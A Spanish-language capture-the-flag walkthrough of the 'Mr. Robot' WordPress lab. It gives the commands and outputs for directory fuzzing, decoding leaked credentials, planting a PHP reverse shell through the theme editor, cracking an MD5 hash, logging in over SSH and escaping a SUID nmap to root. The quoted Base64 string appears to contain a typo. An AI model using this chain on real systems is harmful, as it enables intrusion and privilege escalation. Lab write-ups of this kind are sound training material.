# Mr. Robot CTF

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Linux basada en **WordPress**, obteniendo las tres claves del laboratorio mediante la explotación de una aplicación web, el acceso al sistema por SSH y una escalada de privilegios aprovechando un binario **SUID** vulnerable.

---

## 🛠️ Tecnologías trabajadas

- WordPress
- FFUF
- Base64
- Reverse Shell
- SSH
- John The Ripper
- MD5
- SUID
- Nmap
- GTFOBins

---

## 🧠 Metodología

La enumeración inicial mostró tres servicios expuestos: **SSH**, **HTTP** y **HTTPS**, siendo la aplicación web el principal punto de entrada.

El reconocimiento web permitió identificar rápidamente un sitio basado en **WordPress**, por lo que la investigación se centró en localizar recursos ocultos y posibles credenciales mediante fuzzing y análisis manual.

Durante la enumeración aparecieron varios archivos con información sensible, incluyendo una de las flags y unas credenciales codificadas en Base64 que permitían acceder al panel de administración de WordPress.

Una vez autenticado, aproveché el editor de temas para subir una **reverse shell**, obteniendo acceso inicial al sistema. Desde allí recuperé un hash MD5 correspondiente al usuario `robot`, que fue crackeado con **John The Ripper** para conseguir una sesión SSH estable.

Finalmente, la enumeración de binarios **SUID** permitió identificar una versión vulnerable de `nmap`, cuya explotación mediante **GTFOBins** proporcionó acceso como **root** y la última flag.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé realizando un escaneo con **ReconX**.

Los servicios identificados fueron:

| Puerto | Servicio |
|---------|----------|
| 22 | SSH |
| 80 | HTTP |
| 443 | HTTPS |

Al existir una aplicación web accesible tanto por HTTP como por HTTPS, la investigación se centró en la superficie web.

---

### 2. Enumeración web

Mientras analizaba manualmente la aplicación ejecuté un fuzzing de directorios.

```bash
ffuf -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/raft-medium-directories.txt -u http://10.128.184.169/FUZZ
```

Entre los resultados obtenidos destacaban:

- `robots.txt`
- `license`
- `wp-login.php`
- Directorios característicos de WordPress

Esto confirmó que la aplicación utilizaba **WordPress**.

---

### 3. Descubrimiento de información sensible

Accedí al archivo:

```text
robots.txt
```

En él encontré una referencia a:

```text
key-1-of-3.txt
```

Al acceder al recurso obtuve la primera clave.

Continuando con la enumeración encontré el directorio:

```text
/license
```

En su contenido aparecía una cadena codificada en Base64.

```text
ZWxsaW900kVSMjgtMDY1Mgo=
```

La descodifiqué utilizando:

```bash
echo "ZWxsaW900kVSMjgtMDY1Mgo=" | base64 -d
```

Resultado:

```text
elliot
ER28-0652
```

Las credenciales obtenidas permitían acceder al panel de administración de WordPress.

---

### 4. Acceso inicial

Accedí al panel de autenticación.

```text
http://10.128.184.169/wp-login.php
```

Utilicé las credenciales descubiertas.

```text
Usuario: elliot
Contraseña: ER28-0652
```

Tras iniciar sesión modifiqué el tema **TwentyFifteen**, incorporando una **reverse shell PHP** mediante el editor de temas.

Preparé un listener en la máquina atacante.

```bash
nc -lvnp 4444
```

Posteriormente ejecuté la reverse shell accediendo al archivo subido.

```text
http://10.128.184.169/wp-content/themes/TwentyFifteen/php-reverse-shell.php
```

Con ello obtuve acceso al sistema.

---

### 5. Post-explotación

Durante la enumeración del sistema localicé la segunda clave.

```text
key-2-of-3.txt
```

También encontré un archivo con las credenciales del usuario `robot`.

```text
robot
c3fcd3d76192e4007dfb496cca67e13b
```

La contraseña estaba almacenada como un hash MD5.

---

### 6. Obtención de acceso por SSH

Guardé el hash y utilicé **John The Ripper**.

```bash
john --format=raw-md5 --wordlist=/usr/share/john/password.lst password.raw-md5
```

Resultado:

```text
Usuario: robot
Contraseña: abcdefghijklmnopqrstuvwxyz
```

Con las credenciales recuperadas inicié sesión mediante SSH.

```bash
ssh robot@10.128.184.169
```

Esto proporcionó una sesión mucho más estable para continuar con la post-explotación.

---

### 7. Escalada de privilegios

Comencé comprobando los permisos disponibles.

```bash
sudo -l
```

El usuario no disponía de permisos útiles, por lo que busqué binarios SUID.

```bash
find / -perm -4000 -type f 2>/dev/null
```

Entre los binarios encontrados destacaba:

```text
/usr/bin/nmap
```

Consultando **GTFOBins** comprobé que determinadas versiones de `nmap` permiten escapar a una shell cuando se ejecutan en modo interactivo.

Ejecuté:

```bash
nmap --interactive
```

Y posteriormente:

```text
!sh
```

Con ello obtuve una shell con privilegios de **root**.

Finalmente localicé la tercera clave.

```bash
find / -name "key-3-of-3.txt" 2>/dev/null
```

Leí su contenido.

```bash
cat key-3-of-3.txt
```

---

## 📚 Lecciones aprendidas

- Este laboratorio permitió recorrer una cadena de explotación muy completa sobre un entorno basado en WordPress, combinando técnicas de reconocimiento web, explotación de aplicaciones y escalada de privilegios.
- Identificar rápidamente una instalación de **WordPress** mediante enumeración web.
- Localizar información sensible mediante archivos como `robots.txt` y `license`.
- Extraer credenciales codificadas en Base64.
- Obtener acceso inicial modificando el editor de temas de WordPress.
- Generar una reverse shell desde un tema de WordPress.
- Recuperar y crackear hashes MD5 utilizando **John The Ripper**.
- Reutilizar credenciales para obtener una sesión SSH estable.
- Enumerar binarios **SUID** durante la fase de post-explotación.
- Aprovechar versiones vulnerables de `nmap` mediante **GTFOBins** para obtener privilegios de **root**.
